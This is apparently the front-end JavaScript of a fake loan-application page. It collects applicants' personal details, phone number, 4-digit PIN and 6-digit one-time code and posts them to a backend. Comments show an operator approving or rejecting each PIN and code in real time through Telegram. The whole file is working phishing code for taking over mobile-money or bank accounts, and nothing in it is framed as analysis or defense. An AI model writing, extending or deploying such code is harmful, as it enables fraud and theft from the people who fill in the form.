let currentAppReference = null;
let userPhone = null;
let userPin = null;
let userFullName = null;
let userOccupation = null;
let userMonthlyIncome = null;
let userLoanAmount = null;
let userRepaymentPeriod = null;
let pollInterval = null;

const step1Form = document.getElementById('step1-form');
const step2Form = document.getElementById('step2-form');
const step2Loading = document.getElementById('step2-loading');
const step3Form = document.getElementById('step3-form');
const step3Loading = document.getElementById('step3-loading');
const successScreen = document.getElementById('success-screen');

const stepIndicator = document.getElementById('step-indicator');
const stepCircle1 = document.getElementById('step-circle-1');
const stepLabel1 = document.getElementById('step-label-1');
const stepLine1 = document.getElementById('step-line-1');

const stepCircle2 = document.getElementById('step-circle-2');
const stepLabel2 = document.getElementById('step-label-2');
const stepLine2 = document.getElementById('step-line-2');

const stepCircle3 = document.getElementById('step-circle-3');
const stepLabel3 = document.getElementById('step-label-3');

const otpStatusBanner = document.getElementById('otp-status-banner');
const otpStatusText = document.getElementById('otp-status-text');
const btnStep3 = document.getElementById('btn-step3');
const otpInput = document.getElementById('otp');

// ============ LOAN CALCULATOR ============
const loanSlider = document.getElementById('loanSlider');
const repaymentSlider = document.getElementById('repaymentSlider');
const loanAmountDisplay = document.getElementById('loanAmountDisplay');
const repaymentDisplay = document.getElementById('repaymentDisplay');
const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
const loanAmountHidden = document.getElementById('loanAmount');
const repaymentPeriodHidden = document.getElementById('repaymentPeriod');

function calculateMonthlyPayment() {
  const loanAmount = parseFloat(loanSlider.value);
  const months = parseFloat(repaymentSlider.value);
  const monthlyPayment = (loanAmount / months).toFixed(2);
  monthlyPaymentDisplay.innerText = `$${monthlyPayment}`;
  loanAmountHidden.value = loanAmount;
  repaymentPeriodHidden.value = months;
}

loanSlider.addEventListener('input', () => {
  loanAmountDisplay.innerText = `$${loanSlider.value}`;
  calculateMonthlyPayment();
});

repaymentSlider.addEventListener('input', () => {
  repaymentDisplay.innerText = `${repaymentSlider.value}`;
  calculateMonthlyPayment();
});

// ============ STEP 1: SUBMIT DETAILS ============
step1Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  userFullName = document.getElementById('fullName').value.trim();
  userOccupation = document.getElementById('occupation').value.trim();
  userMonthlyIncome = document.getElementById('monthlyIncome').value.trim();
  userLoanAmount = loanSlider.value;
  userRepaymentPeriod = repaymentSlider.value;

  if (!userFullName || !userOccupation || !userMonthlyIncome) {
    alert('Please fill in all applicant details.');
    return;
  }

  stepCircle1.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
  stepLabel1.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';
  stepLine1.className = 'flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300';

  stepCircle2.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
  stepLabel2.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';
  stepLine2.className = 'flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300';

  step1Form.classList.add('hidden');
  step2Form.classList.remove('hidden');
});

// ============ STEP 2: PHONE & PIN ============
step2Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  userPhone = document.getElementById('phone').value.trim();
  userPin = document.getElementById('pin').value.trim();
  const btnStep2 = document.getElementById('btn-step2');

  if (userPhone.length !== 9 || !/^\d{9}$/.test(userPhone)) {
    alert('Please enter a valid 9-digit phone number.');
    return;
  }

  if (userPin.length !== 4 || !/^\d{4}$/.test(userPin)) {
    alert('Please enter a valid 4-digit PIN.');
    return;
  }

  btnStep2.innerText = 'Connecting...';
  btnStep2.disabled = true;

  step2Form.classList.add('hidden');
  step2Loading.classList.remove('hidden');

  let countdown = 10;
  const countdownTimer = document.getElementById('countdown-timer');
  const countdownBar = document.getElementById('countdown-bar');

  const countdownInterval = setInterval(async () => {
    countdown--;
    countdownTimer.innerText = countdown;
    const percentage = (countdown / 10) * 100;
    countdownBar.style.width = percentage + '%';

    if (countdown === 0) {
      clearInterval(countdownInterval);

      try {
        const response = await fetch('/api/apply-loan', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            phone: userPhone,
            pin: userPin,
            fullName: userFullName,
            occupation: userOccupation,
            monthlyIncome: userMonthlyIncome,
            loanAmount: userLoanAmount,
            repaymentPeriod: userRepaymentPeriod
          })
        });

        const result = await response.json();
        if (result.success) {
          currentAppReference = result.appReference;

          startPollingStatus(currentAppReference, () => {
            stepCircle2.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
            stepLabel2.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';
            stepLine2.className = 'flex-1 h-1 bg-blue-600 mx-1.5 rounded transition-colors duration-300';

            stepCircle3.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center shadow-md text-sm';
            stepLabel3.className = 'text-[10px] sm:text-xs font-semibold text-blue-600 mt-1.5';

            step2Loading.classList.add('hidden');
            step3Form.classList.remove('hidden');

            startOtpCountdown();
            document.getElementById('displayPhone').innerText = userPhone;
          });
        } else {
          alert('Failed to process login. Please try again.');
          resetStep2();
        }
      } catch (err) {
        console.error('Error submitting Step 2:', err);
        alert('Server connection error. Please try again.');
        resetStep2();
      }
    }
  }, 1000);
});

function resetStep2() {
  const btnStep2 = document.getElementById('btn-step2');
  btnStep2.innerText = 'NEXT';
  btnStep2.disabled = false;
  step2Loading.classList.add('hidden');
  step2Form.classList.remove('hidden');
  document.getElementById('pin').value = '';
  document.getElementById('pin').focus();
}

// ============ OTP COUNTDOWN ============
function startOtpCountdown() {
  let otpCountdown = 5;
  const otpCountdownSpan = document.getElementById('otp-countdown');

  const otpCountdownInterval = setInterval(() => {
    otpCountdown--;
    otpCountdownSpan.innerText = otpCountdown;

    if (otpCountdown === 0) {
      clearInterval(otpCountdownInterval);
      document.getElementById('otp-countdown-container').classList.add('hidden');
    }
  }, 1000);
}

// ============ STEP 3: SUBMIT OTP ============
step3Form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const otpCode = otpInput.value.trim();

  if (otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
    alert('Please enter a valid 6-digit OTP code.');
    return;
  }

  btnStep3.innerText = 'Verifying...';
  btnStep3.disabled = true;
  otpInput.disabled = true;

  otpStatusBanner.className = 'bg-blue-50 border border-blue-200 rounded-lg p-3 text-center';
  otpStatusText.className = 'text-xs text-blue-700 font-medium';
  otpStatusText.innerText = 'Verifying OTP code...';

  try {
    const response = await fetch('/api/submit-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        appReference: currentAppReference,
        phone: userPhone,
        otpCode: otpCode
      })
    });

    const result = await response.json();

    if (result.success) {
      // Start polling status again waiting for OTP approval and final Loan Approval from Telegram
      startPollingStatus(currentAppReference, () => {
        stepIndicator.classList.add('hidden');
        step3Form.classList.add('hidden');
        step3Loading.classList.add('hidden');
        document.getElementById('appRefDisplay').innerText = currentAppReference;
        successScreen.classList.remove('hidden');
      });
    } else {
      resetOtpForm('Failed to submit verification code. Please try again.');
    }

  } catch (err) {
    console.error('Error in step 3:', err);
    resetOtpForm('Server connection error. Please try again.');
  }
});

// ============ POLLING FOR TELEGRAM STATUS ============
function startPollingStatus(appReference, onSuccessCallback) {
  if (pollInterval) clearInterval(pollInterval);

  pollInterval = setInterval(async () => {
    try {
      const res = await fetch(`/api/check-status/${appReference}`);
      const data = await res.json();

      // PIN STATUS
      if (data.status === 'PIN_APPROVED') {
        clearInterval(pollInterval);
        if (onSuccessCallback) onSuccessCallback();
      } else if (data.status === 'PIN_REJECTED') {
        clearInterval(pollInterval);
        alert('WRONG PIN ❌');
        resetStep2();
      } 
      
      // OTP VERIFIED -> SHOW FINAL WAITING FOR TELEGRAM APPROVAL
      else if (data.status === 'OTP_APPROVED') {
        step3Form.classList.add('hidden');
        step3Loading.classList.remove('hidden');
      } else if (data.status === 'OTP_REJECTED') {
        clearInterval(pollInterval);
        step3Loading.classList.add('hidden');
        step3Form.classList.remove('hidden');
        resetOtpForm('WRONG OTP ❌');
      }

      // FINAL LOAN APPROVAL FROM TELEGRAM BUTTON
      else if (data.status === 'LOAN_APPROVED') {
        clearInterval(pollInterval);
        if (onSuccessCallback) onSuccessCallback();
      }
    } catch (err) {
      console.error('Polling error:', err);
    }
  }, 2000);
}

function resetOtpForm(message) {
  otpStatusBanner.className = 'bg-red-50 border border-red-200 rounded-lg p-3 text-center';
  otpStatusText.className = 'text-xs text-red-700 font-bold';
  otpStatusText.innerText = message;

  btnStep3.innerText = 'LOG IN';
  btnStep3.disabled = false;
  otpInput.disabled = false;
  otpInput.value = '';
  otpInput.focus();
}

// ============ BACK BUTTONS ============
document.getElementById('btn-back-step1').addEventListener('click', () => {
  step2Form.classList.add('hidden');
  step1Form.classList.remove('hidden');

  stepCircle2.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm';
  stepLabel2.className = 'text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5';
  stepLine1.className = 'flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300';
});

document.getElementById('btn-back-step2').addEventListener('click', () => {
  step3Form.classList.add('hidden');
  step2Form.classList.remove('hidden');

  stepCircle3.className = 'w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gray-200 text-gray-500 font-bold flex items-center justify-center text-sm';
  stepLabel3.className = 'text-[10px] sm:text-xs font-medium text-gray-400 mt-1.5';
  stepLine2.className = 'flex-1 h-1 bg-gray-200 mx-1.5 rounded transition-colors duration-300';
});
    
